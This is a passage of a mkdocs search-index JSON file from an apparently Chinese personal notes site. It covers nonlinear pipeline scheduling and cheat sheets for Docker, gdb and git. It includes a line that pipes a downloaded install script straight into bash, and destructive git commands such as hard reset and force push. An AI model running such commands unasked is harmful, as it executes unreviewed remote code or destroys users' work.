\u4e3a\u603b\u957f\u5ea6\u52a0\u4e00\uff0c\u76f8\u5f53\u4e8e\u786c\u7b49\u4e00\u4e2a\u4efb\u52a1\u7684\u65f6\u5e38\uff09\u3002\u4ee5\u540e\u7b2c\u4e00\u4e2a\u5468\u671f\u8fdb\u5165\u4e3a\u4f8b\u3002\u7b2c\u4e8c\u4e2a\u4efb\u52a1\u7684\u521d\u59cb\u51b2\u7a81\u5411\u91cf\u4e5f\u4e3a \\(C=\\mathtt{101100}\\) \uff0c\u6b64\u65f6\u7b2c\u4e00\u4e2a\u4efb\u52a1\u7ecf\u8fc7\u4e86\u4e00\u4e2a\u5468\u671f\uff0c\u51b2\u7a81\u5411\u91cf\u53f3\u79fb\u4e00\u4f4d\u53d8\u4e3a \\(C=\\mathtt{10110}\\) \u3002\u63a5\u7740\u518d\u8003\u8651\u52a0\u5165\u7b2c\u4e09\u4e2a\u4efb\u52a1\uff0c\u8fd9\u4e2a\u4efb\u52a1\u4e0d\u80fd\u548c 1\u30012 \u4e24\u4e2a\u51b2\u7a81\uff0c\u6240\u4ee5\u6b64\u65f6\u6574\u4f53\u7684\u51b2\u7a81\u5411\u91cf\u5e94\u8be5\u662f\u524d\u4e24\u4e2a\u4efb\u52a1\u6b64\u65f6\u7684\u51b2\u7a81\u5411\u91cf\u6309\u4f4d\u6c42\u6216\uff0c\u5373 \\(\\mathtt{101100} | \\mathtt{10110} = \\mathtt{111110}\\) \u3002\u6240\u4ee5\u7b2c\u4e09\u4e2a\u4efb\u52a1\u53ea\u80fd\u5728\u540e\u4e00\u4e2a\u5468\u671f\u8fdb\u5165\u3002 \u8fd9\u6837\u4f9d\u6b64\u7c7b\u63a8\uff0c\u6700\u7ec8\u4e0d\u518d\u8ba1\u7b97\u4e0b\u53bb\u7684\u6761\u4ef6\u4e3a\uff1a\u51b2\u7a81\u5411\u91cf\u53d8\u4e3a\u4e86\u5168 1\uff0c\u53ea\u80fd\u7b49\u5f85\u4e00\u4e2a\u4efb\u52a1\u7684\u65f6\u957f\u56de\u5230\u521d\u59cb\u72b6\u6001\uff1b\u6216\u8005\u5f97\u5230\u7684\u51b2\u7a81\u5411\u91cf\u548c\u4e4b\u524d\u7684\u67d0\u4e2a\u76f8\u540c\uff08\u8fbe\u6210\u4e86\u5faa\u73af\uff09\u3002\u6700\u7ec8\u53ef\u4ee5\u753b\u51fa\u4e00\u4e2a\u72b6\u6001\u56fe\u3002 \u5bf9\u4e8e\u4e0a\u9762\u7684\u4f8b\u5b50\uff0c\u5b83\u7684\u72b6\u6001\u56fe\u5982\u4e0b\uff08\u65b9\u5757\u5185\u4e3a\u51b2\u7a81\u5411\u91cf\uff0c\u7bad\u5934\u4e0a\u4e3a\u7b49\u5f85\u51e0\u4e2a\u5468\u671f\u8fdb\u5165\uff0c\u5373\u542f\u52a8\u8ddd\u79bb\uff09\uff1a \u6240\u4ee5\u5b83\u7684\u51e0\u79cd\u8c03\u5ea6\u65b9\u5f0f\uff08\u7528\u542f\u52a8\u8ddd\u79bb\u8868\u793a\uff09\u548c\u5e73\u5747\u542f\u52a8\u8ddd\u79bb\u4e3a\uff1a \u8c03\u5ea6\u65b9\u5f0f \u5e73\u5747\u542f\u52a8\u8ddd\u79bb 7 7 1, 7 4 1, 1, 7 3 2, 7 4.5 2, 5 3.5 2, 5, 7 4.67 5 5 5, 2 3.5 5, 7 6 \u6240\u4ee5\u6700\u77ed\u5e73\u5747\u542f\u52a8\u8ddd\u79bb\u4e3a 3\uff0c\u5bf9\u5e94\u7684\u8c03\u5ea6\u65b9\u5f0f\u4e3a 1\u30011\u30017\u3002","title":"\u975e\u7ebf\u6027\u6d41\u6c34\u7ebf\u8c03\u5ea6\u7b97\u6cd5"},{"location":"cs/tools/","text":"\u5de5\u5177\u76f8\u5173 \u00b6 Abstract \u4e00\u4e9b\u5de5\u5177\u7684\u7528\u6cd5\u8bb0\u5f55\uff0c\u4ee5\u53ca\u547d\u4ee4\u884c\u5de5\u5177\u7684\u5907\u5fd8\u547d\u4ee4 \u547d\u4ee4\u884c\u5de5\u5177 \u00b6 Git \u547d\u4ee4\u5907\u5fd8 Shell \u547d\u4ee4\u5907\u5fd8 Docker \u76f8\u5173\u5907\u5fd8 gdb \u76f8\u5173\u5907\u5fd8 CI \u5de5\u5177 \u00b6 GitHub Action \u4f7f\u7528\u65b9\u6cd5\uff08 TODO \uff09 \u7ad9\u70b9\u751f\u6210\u5de5\u5177 \u00b6 mkdocs \u4f7f\u7528\u8bb0\u5f55 hexo \u4f7f\u7528\u8bb0\u5f55 sphinx \u4f7f\u7528\u8bb0\u5f55","title":"\u5de5\u5177\u76f8\u5173"},{"location":"cs/tools/#_1","text":"Abstract \u4e00\u4e9b\u5de5\u5177\u7684\u7528\u6cd5\u8bb0\u5f55\uff0c\u4ee5\u53ca\u547d\u4ee4\u884c\u5de5\u5177\u7684\u5907\u5fd8\u547d\u4ee4","title":"\u5de5\u5177\u76f8\u5173"},{"location":"cs/tools/#_2","text":"Git \u547d\u4ee4\u5907\u5fd8 Shell \u547d\u4ee4\u5907\u5fd8 Docker \u76f8\u5173\u5907\u5fd8 gdb \u76f8\u5173\u5907\u5fd8","title":"\u547d\u4ee4\u884c\u5de5\u5177"},{"location":"cs/tools/#ci","text":"GitHub Action \u4f7f\u7528\u65b9\u6cd5\uff08 TODO \uff09","title":"CI \u5de5\u5177"},{"location":"cs/tools/#_3","text":"mkdocs \u4f7f\u7528\u8bb0\u5f55 hexo \u4f7f\u7528\u8bb0\u5f55 sphinx \u4f7f\u7528\u8bb0\u5f55","title":"\u7ad9\u70b9\u751f\u6210\u5de5\u5177"},{"location":"cs/tools/action/","text":"","title":"GitHub Action"},{"location":"cs/tools/docker/","text":"Docker \u76f8\u5173\u5907\u5fd8 \u00b6 Abstract \u4e00\u4e9b\u5e38\u7528/\u5e38\u5fd8\u7684 docker \u547d\u4ee4\u3001Dockerfile \u7b49 \u5b89\u88c5 \u00b6 curl -fsSL https://get.docker.com | bash -s docker --mirror Aliyun sudo curl -L \"https://github.com/docker/compose/releases/download/1.25.5/docker-compose-$(uname -s)-$(uname -m)\" -o /usr/local/bin/docker-compose sudo chmod +x /usr/local/bin/docker-compose docker \u547d\u4ee4 \u00b6 \u955c\u50cf\u76f8\u5173 \u00b6 docker images \u5217\u51fa\u672c\u5730\u955c\u50cf docker search <image> \u641c\u7d22\u955c\u50cf docker pull <image> \u62c9\u53d6\u955c\u50cf docker rmi <image> \u5220\u9664\u955c\u50cf docker build -t <image> . \u4ece Dockerfile \u6784\u5efa\u955c\u50cf\uff0c\u5e76\u6253\u4e0a tag <image> docker export <image> > <file>.tar \u4fdd\u5b58\u955c\u50cf\u4e3a tar \u5305 docker import <file>.tar <image> \u4ece tar \u5305\u5bfc\u5165\u955c\u50cf docker tag <image> <image>:<tag> \u7ed9\u955c\u50cf\u6253 tag\uff08\u91cd\u547d\u540d\uff09 \u5bb9\u5668\u76f8\u5173 \u00b6 docker ps -a \u5217\u51fa\u6b63\u5728\u8fd0\u884c\u7684\u5bb9\u5668 docker run -it <image> \u8fd0\u884c\u955c\u50cf -d \u540e\u53f0\u8fd0\u884c -p <host>:<container> \u7aef\u53e3\u6620\u5c04 -v <host>:<container> \u76ee\u5f55\u6620\u5c04 -e <key>=<value> \u73af\u5883\u53d8\u91cf --name <name> \u5bb9\u5668\u540d --rm \u8fd0\u884c\u5b8c\u540e\u81ea\u52a8\u5220\u9664\u5bb9\u5668 --network <network> \u6307\u5b9a\u7f51\u7edc docker start <container> \u542f\u52a8\u5bb9\u5668 docker restart <container> \u91cd\u542f\u5bb9\u5668 docker stop <container> \u505c\u6b62\u5bb9\u5668 docker rm <container> \u5220\u9664\u5bb9\u5668 docker exec -it <container> /bin/bash \u8fdb\u5165\u5bb9\u5668 docker cp ... ... \u5728\u672c\u5730\u548c\u5bb9\u5668\u4e4b\u95f4\u590d\u5236\u6587\u4ef6\uff08\u7528\u6cd5\u7c7b\u4f3c scp\uff09 \u7f51\u7edc\u76f8\u5173 \u00b6 docker network ls \u5217\u51fa\u7f51\u7edc docker network create <network> \u521b\u5efa\u7f51\u7edc docker network connect <network> <container> \u5c06\u5bb9\u5668\u8fde\u63a5\u5230\u7f51\u7edc docker network inspect <network> \u67e5\u770b\u7f51\u7edc\u4fe1\u606f docker network rm <network> \u5220\u9664\u7f51\u7edc \u4ed3\u5e93\u76f8\u5173 \u00b6 docker login <url> \u8fde\u63a5 registry docker login \u8fde\u63a5\u5230 Docker Hub docker login ghcr.io \u8fde\u63a5\u5230 GitHub \u7684\u4ed3\u5e93\uff0c\u7528\u6237\u540d\u662f GitHub \u7528\u6237\u540d\uff0c\u5bc6\u7801\u662f GitHub \u751f\u6210\u7684 token\uff08ghp_ \u5f00\u5934\uff09 docker logout <url> \u65ad\u5f00 registry docker push <image> \u63a8\u9001\u955c\u50cf\u5230 registry\uff08\u4f1a\u6839\u636e\u524d\u7f00\u81ea\u52a8\u9009\u62e9 registry\uff09 docker pull <image> \u4ece registry \u62c9\u53d6\u955c\u50cf registry \u955c\u50cf \u00b6 \u53ef\u4ee5\u5229\u7528 registry \u955c\u50cf\u6765\u81ea\u5efa\u79c1\u6709 registry docker pull registry:2 \u62c9\u53d6 registry \u955c\u50cf \u9700\u8981\u6302\u8f7d\u7684\u76ee\u5f55 ./auth:/auth \uff1a\u7528\u6237\u540d\u548c\u5bc6\u7801\u3002\u5728\u672c\u5730 auth \u76ee\u5f55\u4e0b\u6267\u884c docker run --entrypoint htpasswd registry:2.7.0 -Bbn <username> <password> > htpasswd \u751f\u6210\u6587\u4ef6 ./certs:/certs \uff1aSSL \u8bc1\u4e66\uff0c\u53ef\u4ee5\u7528 acme.sh \u6765\u7b7e ./registry:/var/lib/registry \uff1aregistry \u6570\u636e \u542f\u52a8 registry\uff1a docker run -itd -p 5000 :5000 --restart = always --name registry \\ -v ./certs:/certs \\ -v ./auth:/auth \\ -v ./registry:/var/lib/registry \\ -e \"REGISTRY_HTTP_TLS_CERTIFICATE=/certs/fullchain.cer\" \\ -e \"REGISTRY_HTTP_TLS_KEY=/certs/<domain>.key\" \\ -e \"REGISTRY_AUTH=htpasswd\" -e \"REGISTRY_AUTH_HTPASSWD_REALM=Registry Realm\" \\ -e \"REGISTRY_AUTH_HTPASSWD_PATH=/auth/htpasswd\" \\ registry:2 docker login <url> \u767b\u5f55 registry docker tag <image> <url>/<image> \u7ed9\u955c\u50cf\u6253\u4e0a registry \u7684 tag docker push <url>/<image> \u63a8\u9001\u955c\u50cf\u5230 registry Dockerfile \u00b6 \u5e38\u7528\u6362\u6e90 \u00b6 Ubuntu \u8f6f\u4ef6\u6e90 \u00b6 RUN sed -i s@/archive.ubuntu.com/@/mirrors.aliyun.com/@g /etc/apt/sources.list # RUN sed -i s@/archive.ubuntu.com/@/<...>/@g /etc/apt/sources.list RUN apt-get clean RUN apt-get update Debian \u8f6f\u4ef6\u6e90 \u00b6 RUN sed -i s/deb.debian.org/mirrors.aliyun.com/g /etc/apt/sources.list && \\ ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime && echo 'Asia/Shanghai' >/etc/timezone RUN apt-get update","title":"Docker \u76f8\u5173\u5907\u5fd8"},{"location":"cs/tools/docker/#docker","text":"Abstract \u4e00\u4e9b\u5e38\u7528/\u5e38\u5fd8\u7684 docker \u547d\u4ee4\u3001Dockerfile \u7b49","title":"Docker \u76f8\u5173\u5907\u5fd8"},{"location":"cs/tools/docker/#_1","text":"curl -fsSL https://get.docker.com | bash -s docker --mirror Aliyun sudo curl -L \"https://github.com/docker/compose/releases/download/1.25.5/docker-compose-$(uname -s)-$(uname -m)\" -o /usr/local/bin/docker-compose sudo chmod +x /usr/local/bin/docker-compose","title":"\u5b89\u88c5"},{"location":"cs/tools/docker/#docker_1","text":"","title":"docker \u547d\u4ee4"},{"location":"cs/tools/docker/#_2","text":"docker images \u5217\u51fa\u672c\u5730\u955c\u50cf docker search <image> \u641c\u7d22\u955c\u50cf docker pull <image> \u62c9\u53d6\u955c\u50cf docker rmi <image> \u5220\u9664\u955c\u50cf docker build -t <image> . \u4ece Dockerfile \u6784\u5efa\u955c\u50cf\uff0c\u5e76\u6253\u4e0a tag <image> docker export <image> > <file>.tar \u4fdd\u5b58\u955c\u50cf\u4e3a tar \u5305 docker import <file>.tar <image> \u4ece tar \u5305\u5bfc\u5165\u955c\u50cf docker tag <image> <image>:<tag> \u7ed9\u955c\u50cf\u6253 tag\uff08\u91cd\u547d\u540d\uff09","title":"\u955c\u50cf\u76f8\u5173"},{"location":"cs/tools/docker/#_3","text":"docker ps -a \u5217\u51fa\u6b63\u5728\u8fd0\u884c\u7684\u5bb9\u5668 docker run -it <image> \u8fd0\u884c\u955c\u50cf -d \u540e\u53f0\u8fd0\u884c -p <host>:<container> \u7aef\u53e3\u6620\u5c04 -v <host>:<container> \u76ee\u5f55\u6620\u5c04 -e <key>=<value> \u73af\u5883\u53d8\u91cf --name <name> \u5bb9\u5668\u540d --rm \u8fd0\u884c\u5b8c\u540e\u81ea\u52a8\u5220\u9664\u5bb9\u5668 --network <network> \u6307\u5b9a\u7f51\u7edc docker start <container> \u542f\u52a8\u5bb9\u5668 docker restart <container> \u91cd\u542f\u5bb9\u5668 docker stop <container> \u505c\u6b62\u5bb9\u5668 docker rm <container> \u5220\u9664\u5bb9\u5668 docker exec -it <container> /bin/bash \u8fdb\u5165\u5bb9\u5668 docker cp ... ... \u5728\u672c\u5730\u548c\u5bb9\u5668\u4e4b\u95f4\u590d\u5236\u6587\u4ef6\uff08\u7528\u6cd5\u7c7b\u4f3c scp\uff09","title":"\u5bb9\u5668\u76f8\u5173"},{"location":"cs/tools/docker/#_4","text":"docker network ls \u5217\u51fa\u7f51\u7edc docker network create <network> \u521b\u5efa\u7f51\u7edc docker network connect <network> <container> \u5c06\u5bb9\u5668\u8fde\u63a5\u5230\u7f51\u7edc docker network inspect <network> \u67e5\u770b\u7f51\u7edc\u4fe1\u606f docker network rm <network> \u5220\u9664\u7f51\u7edc","title":"\u7f51\u7edc\u76f8\u5173"},{"location":"cs/tools/docker/#_5","text":"docker login <url> \u8fde\u63a5 registry docker login \u8fde\u63a5\u5230 Docker Hub docker login ghcr.io \u8fde\u63a5\u5230 GitHub \u7684\u4ed3\u5e93\uff0c\u7528\u6237\u540d\u662f GitHub \u7528\u6237\u540d\uff0c\u5bc6\u7801\u662f GitHub \u751f\u6210\u7684 token\uff08ghp_ \u5f00\u5934\uff09 docker logout <url> \u65ad\u5f00 registry docker push <image> \u63a8\u9001\u955c\u50cf\u5230 registry\uff08\u4f1a\u6839\u636e\u524d\u7f00\u81ea\u52a8\u9009\u62e9 registry\uff09 docker pull <image> \u4ece registry \u62c9\u53d6\u955c\u50cf","title":"\u4ed3\u5e93\u76f8\u5173"},{"location":"cs/tools/docker/#registry","text":"\u53ef\u4ee5\u5229\u7528 registry \u955c\u50cf\u6765\u81ea\u5efa\u79c1\u6709 registry docker pull registry:2 \u62c9\u53d6 registry \u955c\u50cf \u9700\u8981\u6302\u8f7d\u7684\u76ee\u5f55 ./auth:/auth \uff1a\u7528\u6237\u540d\u548c\u5bc6\u7801\u3002\u5728\u672c\u5730 auth \u76ee\u5f55\u4e0b\u6267\u884c docker run --entrypoint htpasswd registry:2.7.0 -Bbn <username> <password> > htpasswd \u751f\u6210\u6587\u4ef6 ./certs:/certs \uff1aSSL \u8bc1\u4e66\uff0c\u53ef\u4ee5\u7528 acme.sh \u6765\u7b7e ./registry:/var/lib/registry \uff1aregistry \u6570\u636e \u542f\u52a8 registry\uff1a docker run -itd -p 5000 :5000 --restart = always --name registry \\ -v ./certs:/certs \\ -v ./auth:/auth \\ -v ./registry:/var/lib/registry \\ -e \"REGISTRY_HTTP_TLS_CERTIFICATE=/certs/fullchain.cer\" \\ -e \"REGISTRY_HTTP_TLS_KEY=/certs/<domain>.key\" \\ -e \"REGISTRY_AUTH=htpasswd\" -e \"REGISTRY_AUTH_HTPASSWD_REALM=Registry Realm\" \\ -e \"REGISTRY_AUTH_HTPASSWD_PATH=/auth/htpasswd\" \\ registry:2 docker login <url> \u767b\u5f55 registry docker tag <image> <url>/<image> \u7ed9\u955c\u50cf\u6253\u4e0a registry \u7684 tag docker push <url>/<image> \u63a8\u9001\u955c\u50cf\u5230 registry","title":"registry \u955c\u50cf"},{"location":"cs/tools/docker/#dockerfile","text":"","title":"Dockerfile"},{"location":"cs/tools/docker/#_6","text":"","title":"\u5e38\u7528\u6362\u6e90"},{"location":"cs/tools/docker/#ubuntu","text":"RUN sed -i s@/archive.ubuntu.com/@/mirrors.aliyun.com/@g /etc/apt/sources.list # RUN sed -i s@/archive.ubuntu.com/@/<...>/@g /etc/apt/sources.list RUN apt-get clean RUN apt-get update","title":"Ubuntu \u8f6f\u4ef6\u6e90"},{"location":"cs/tools/docker/#debian","text":"RUN sed -i s/deb.debian.org/mirrors.aliyun.com/g /etc/apt/sources.list && \\ ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime && echo 'Asia/Shanghai' >/etc/timezone RUN apt-get update","title":"Debian \u8f6f\u4ef6\u6e90"},{"location":"cs/tools/gdb/","text":"gdb \u76f8\u5173\u5907\u5fd8 \u00b6 Abstract \u548c gdb \u76f8\u5173\u7684\u4e00\u4e9b\u6307\u4ee4\u5907\u5fd8\u3001\u63d2\u4ef6\u5b89\u88c5\u65b9\u5f0f\u7b49 gdb \u547d\u4ee4 \u00b6 \u8fd0\u884c \u00b6 (gdb) run \u76f4\u63a5\u8fd0\u884c (r) (gdb) continue \u7ee7\u7eed\u8fd0\u884c (c) (gdb) step \u8fd0\u884c\u5230\u4e0b\u4e00\u6761\u6e90\u7801 (s) (gdb) stepi \u8fd0\u884c\u5230\u4e0b\u4e00\u6761\u6307\u4ee4 (si) (gdb) next \u5355\u6b65\u8fd0\u884c\uff0c\u8df3\u8fc7\u51fd\u6570 (n) (gdb) finish \u8fd0\u884c\u5b8c\u5f53\u524d\u51fd\u6570 (fin) (gdb) attach <pid> \u8fde\u63a5\u7a0b\u5e8f (gdb) detach \u4ece\u5f53\u524d\u7a0b\u5e8f\u65ad\u8fde (gdb) target remote localhost:1234 \u8fde\u63a5 qemu \u65ad\u70b9 \u00b6 (gdb) break main \u65ad\u5728\u7b26\u53f7\u5904 (b) (gdb) break *0x.... \u65ad\u5728\u5730\u5740 (gdb) info breakpoints \u67e5\u770b\u65ad\u70b9\u53ca\u72b6\u6001 (i b) (gdb) delete / clear \u6e05\u9664\u6240\u6709\u65ad\u70b9 (d/cl) (gdb) delete <breakpoint#> \u5220\u9664\u67d0\u4e00\u65ad\u70b9\uff08\u4ece i b \u5f97\u6765\u65ad\u70b9\u53f7\uff09 (gdb) clear ... \u6e05\u9664\u67d0\u4e00\u7b26\u53f7\u3001\u5730\u5740\u5904\u7684\u65ad\u70b9 (gdb) disable <breakpoint#> \u7981\u7528\u67d0\u4e00\u65ad\u70b9 (gdb) enable <breakpoint#> \u542f\u7528\u67d0\u4e00\u65ad\u70b9 (gdb) watch ... \u5728\u67d0\u5904\u589e\u52a0\u89c2\u5bdf\u70b9\uff0cdelete\u3001enable\u3001disable \u4e0e\u65ad\u70b9\u5171\u7528 (gdb) break/watch <where> if <condition> \u5982\u679c\u6761\u4ef6\u6ee1\u8db3\u5219\u65ad (gdb) condition <breakpoint#> <condition> \u66f4\u6539\u6761\u4ef6 \u8c03\u7528\u6808 \u00b6 (gdb) backtrace \u67e5\u770b\u8c03\u7528\u6808 (bt) (gdb) frame \u67e5\u770b\u5f53\u524d\u5e27\u6808 (gdb) up/down \u79fb\u52a8\u5f53\u524d\u5e27\u6808\uff08\u5411 main / \u8fdc\u79bb main\uff09 (gdb) info locals \u67e5\u770b\u5f53\u524d\u5e27\u6808\u53d8\u91cf (gdb) info args \u67e5\u770b\u51fd\u6570\u53c2\u6570 \u67e5\u770b\u5bc4\u5b58\u5668/\u53d8\u91cf/\u5185\u5b58 \u00b6 (gdb) print/format <what> format a: pointer c: int -> char d: signed decimal f: floating point number o: int -> octal s: treat as string t: int -> bin u: unsigned decimal x: int -> hex <what> \u53ef\u4ee5\u662f\u7c7b C \u8868\u8fbe\u5f0f \u53ef\u4ee5\u662f file_name::variable_name \u53ef\u4ee5\u662f function::variable_name \u53ef\u4ee5\u662f {type}address \u53ef\u4ee5\u662f $register (gdb) display/format <what> (gdb) undisplay <display#> (gdb) enable display <display#> (gdb) disable display <display#> (gdb) x/nfu <address> \u663e\u793a\u5185\u5b58 n \u8868\u793a\u67e5\u627e\u3001\u6253\u5370\u51e0\u4e2a\u5355\u4f4d f \u8868\u793a format\uff0c\u5728\u524d\u9762\u5199\u4e86 u \u8868\u793a\u5355\u4f4d\uff1ab \u4e00\u5b57\u8282\u3001h \u4e24\u5b57\u8282\u3001w \u56db\u5b57\u8282\u3001g \u516b\u5b57\u8282 (gdb) info register \u67e5\u770b\u6240\u6709\u5bc4\u5b58\u5668 (i r) (gdb) info register <register> \u67e5\u770b\u67d0\u4e00\u5bc4\u5b58\u5668 gdb \u63d2\u4ef6 \u00b6 gdb-peda \u00b6 \u6bcf\u6761\u6307\u4ee4\u5e26\u5bc4\u5b58\u5668\u3001\u6c47\u7f16\u3001\u5185\u5b58\u6570\u636e\u56de\u663e $ git clone https://github.com/longld/peda.git ~/peda $ echo \"source ~/peda/peda.py\" >> ~/.gdbinit","title":"gdb \u76f8\u5173\u5907\u5fd8"},{"location":"cs/tools/gdb/#gdb","text":"Abstract \u548c gdb \u76f8\u5173\u7684\u4e00\u4e9b\u6307\u4ee4\u5907\u5fd8\u3001\u63d2\u4ef6\u5b89\u88c5\u65b9\u5f0f\u7b49","title":"gdb \u76f8\u5173\u5907\u5fd8"},{"location":"cs/tools/gdb/#gdb_1","text":"","title":"gdb \u547d\u4ee4"},{"location":"cs/tools/gdb/#_1","text":"(gdb) run \u76f4\u63a5\u8fd0\u884c (r) (gdb) continue \u7ee7\u7eed\u8fd0\u884c (c) (gdb) step \u8fd0\u884c\u5230\u4e0b\u4e00\u6761\u6e90\u7801 (s) (gdb) stepi \u8fd0\u884c\u5230\u4e0b\u4e00\u6761\u6307\u4ee4 (si) (gdb) next \u5355\u6b65\u8fd0\u884c\uff0c\u8df3\u8fc7\u51fd\u6570 (n) (gdb) finish \u8fd0\u884c\u5b8c\u5f53\u524d\u51fd\u6570 (fin) (gdb) attach <pid> \u8fde\u63a5\u7a0b\u5e8f (gdb) detach \u4ece\u5f53\u524d\u7a0b\u5e8f\u65ad\u8fde (gdb) target remote localhost:1234 \u8fde\u63a5 qemu","title":"\u8fd0\u884c"},{"location":"cs/tools/gdb/#_2","text":"(gdb) break main \u65ad\u5728\u7b26\u53f7\u5904 (b) (gdb) break *0x.... \u65ad\u5728\u5730\u5740 (gdb) info breakpoints \u67e5\u770b\u65ad\u70b9\u53ca\u72b6\u6001 (i b) (gdb) delete / clear \u6e05\u9664\u6240\u6709\u65ad\u70b9 (d/cl) (gdb) delete <breakpoint#> \u5220\u9664\u67d0\u4e00\u65ad\u70b9\uff08\u4ece i b \u5f97\u6765\u65ad\u70b9\u53f7\uff09 (gdb) clear ... \u6e05\u9664\u67d0\u4e00\u7b26\u53f7\u3001\u5730\u5740\u5904\u7684\u65ad\u70b9 (gdb) disable <breakpoint#> \u7981\u7528\u67d0\u4e00\u65ad\u70b9 (gdb) enable <breakpoint#> \u542f\u7528\u67d0\u4e00\u65ad\u70b9 (gdb) watch ... \u5728\u67d0\u5904\u589e\u52a0\u89c2\u5bdf\u70b9\uff0cdelete\u3001enable\u3001disable \u4e0e\u65ad\u70b9\u5171\u7528 (gdb) break/watch <where> if <condition> \u5982\u679c\u6761\u4ef6\u6ee1\u8db3\u5219\u65ad (gdb) condition <breakpoint#> <condition> \u66f4\u6539\u6761\u4ef6","title":"\u65ad\u70b9"},{"location":"cs/tools/gdb/#_3","text":"(gdb) backtrace \u67e5\u770b\u8c03\u7528\u6808 (bt) (gdb) frame \u67e5\u770b\u5f53\u524d\u5e27\u6808 (gdb) up/down \u79fb\u52a8\u5f53\u524d\u5e27\u6808\uff08\u5411 main / \u8fdc\u79bb main\uff09 (gdb) info locals \u67e5\u770b\u5f53\u524d\u5e27\u6808\u53d8\u91cf (gdb) info args \u67e5\u770b\u51fd\u6570\u53c2\u6570","title":"\u8c03\u7528\u6808"},{"location":"cs/tools/gdb/#_4","text":"(gdb) print/format <what> format a: pointer c: int -> char d: signed decimal f: floating point number o: int -> octal s: treat as string t: int -> bin u: unsigned decimal x: int -> hex <what> \u53ef\u4ee5\u662f\u7c7b C \u8868\u8fbe\u5f0f \u53ef\u4ee5\u662f file_name::variable_name \u53ef\u4ee5\u662f function::variable_name \u53ef\u4ee5\u662f {type}address \u53ef\u4ee5\u662f $register (gdb) display/format <what> (gdb) undisplay <display#> (gdb) enable display <display#> (gdb) disable display <display#> (gdb) x/nfu <address> \u663e\u793a\u5185\u5b58 n \u8868\u793a\u67e5\u627e\u3001\u6253\u5370\u51e0\u4e2a\u5355\u4f4d f \u8868\u793a format\uff0c\u5728\u524d\u9762\u5199\u4e86 u \u8868\u793a\u5355\u4f4d\uff1ab \u4e00\u5b57\u8282\u3001h \u4e24\u5b57\u8282\u3001w \u56db\u5b57\u8282\u3001g \u516b\u5b57\u8282 (gdb) info register \u67e5\u770b\u6240\u6709\u5bc4\u5b58\u5668 (i r) (gdb) info register <register> \u67e5\u770b\u67d0\u4e00\u5bc4\u5b58\u5668","title":"\u67e5\u770b\u5bc4\u5b58\u5668/\u53d8\u91cf/\u5185\u5b58"},{"location":"cs/tools/gdb/#gdb_2","text":"","title":"gdb \u63d2\u4ef6"},{"location":"cs/tools/gdb/#gdb-peda","text":"\u6bcf\u6761\u6307\u4ee4\u5e26\u5bc4\u5b58\u5668\u3001\u6c47\u7f16\u3001\u5185\u5b58\u6570\u636e\u56de\u663e $ git clone https://github.com/longld/peda.git ~/peda $ echo \"source ~/peda/peda.py\" >> ~/.gdbinit","title":"gdb-peda"},{"location":"cs/tools/git/","text":"Git \u547d\u4ee4\u5907\u5fd8 \u00b6 Abstract \u4e00\u4e9b\u5e38\u7528/\u5e38\u5fd8\u7684 git \u547d\u4ee4 \u57fa\u7840\u547d\u4ee4 \u00b6 \u5206\u652f \u00b6 git checkout -b <branch_name> \uff1a\u521b\u5efa\u5206\u652f\uff0c\u5e76\u5207\u6362\u8fc7\u53bb git checkout master \uff1a\u56de\u5230\u4e3b\u5206\u652f git push origin <branch_name> \uff1a\u5c06\u5206\u652f\u63a8\u9001\u5230\u8fdc\u7a0b\u4ed3\u5e93 git pull \uff1a\u5c06\u672c\u5730\u4ed3\u5e93\u66f4\u65b0 git diff <branch_name> master \uff1a\u663e\u793a\u5dee\u522b \u514b\u9686\u5206\u652f \u00b6 git clone -b <branch_name> <repo_url> \uff1a\u514b\u9686\u5355\u4e2a\u5206\u652f git branch -a \uff1a\u67e5\u770b\u6240\u6709\u5206\u652f git checkout -b <branch_name> origin/<branch_name> \uff1a\u5173\u8054\u5206\u652f \u6e05\u9664\u547d\u4ee4 \u00b6 git rm --cached <file> \uff1a\u5df2 add \u672a commit \u7684\u6587\u4ef6\u9000\u56de\u672a add \u72b6\u6001 git checkout -- <file> \uff1a\u5df2\u4fee\u6539\u7684\u6587\u4ef6\u64a4\u9500\u4fee\u6539 git reset --soft HEAD^ \uff1a\u64a4\u9500 commit\uff08\u4e0d\u66f4\u6539\u6587\u4ef6\uff09 git reset --hard HEAD^ \uff1a\u64a4\u9500 commit\uff08\u6587\u4ef6\u56de\u9000\u5230\u4e0a\u4e00\u7248\u672c\uff09 git update-ref -d HEAD \uff1a\u64a4\u9500\u7b2c\u4e00\u6761 commit\uff08\u4e0d\u66f4\u6539\u6587\u4ef6\uff09 git push -f \uff1a\u5f3a\u5236\u63a8\u9001\uff0c\u8986\u76d6 commit","title":"Git \u547d\u4ee4\u5907\u5fd8"},{"location":"cs/tools/git/#git","text":"Abstract \u4e00\u4e9b\u5e38\u7528/\u5e38\u5fd8\u7684 git \u547d\u4ee4","title":"Git \u547d\u4ee4\u5907\u5fd8"},{"location":"cs/tools/git/#_1","text":"","title":"\u57fa\u7840\u547d\u4ee4"},{"location":"cs/tools/git/#_2","text":"git checkout -b <branch_name> \uff1a\u521b\u5efa\u5206\u652f\uff0c\u5e76\u5207\u6362\u8fc7\u53bb git checkout master \uff1a\u56de\u5230\u4e3b\u5206\u652f git push origin <branch_name> \uff1a\u5c06\u5206\u652f\u63a8\u9001\u5230\u8fdc\u7a0b\u4ed3\u5e93 git pull \uff1a\u5c06\u672c\u5730\u4ed3\u5e93\u66f4\u65b0 git diff <branch_name> master \uff1a\u663e\u793a\u5dee\u522b","title":"\u5206\u652f"},{"location":"cs/tools/git/#_3","text":"git clone -b <branch_name> <repo_url> \uff1a\u514b\u9686\u5355\u4e2a\u5206\u652f git branch -a \uff1a\u67e5\u770b\u6240\u6709\u5206\u652f git checkout -b <branch_name> origin/<branch_name> \uff1a\u5173\u8054\u5206\u652f","title":"\u514b\u9686\u5206\u652f"},{"location":"cs/tools/git/#_4","text":"git rm --cached <file> \uff1a\u5df2 add \u672a commit \u7684\u6587\u4ef6\u9000\u56de\u672a add \u72b6\u6001 git checkout -- <file> \uff1a\u5df2\u4fee\u6539\u7684\u6587\u4ef6\u64a4\u9500\u4fee\u6539 git reset --soft HEAD^ \uff1a\u64a4\u9500 commit\uff08\u4e0d\u66f4\u6539\u6587\u4ef6\uff09 git reset --hard HEAD^ \uff1a\u64a4\u9500 commit\uff08\u6587\u4ef6\u56de\u9000\u5230\u4e0a\u4e00\u7248\u672c\uff09 git update-ref -d HEAD 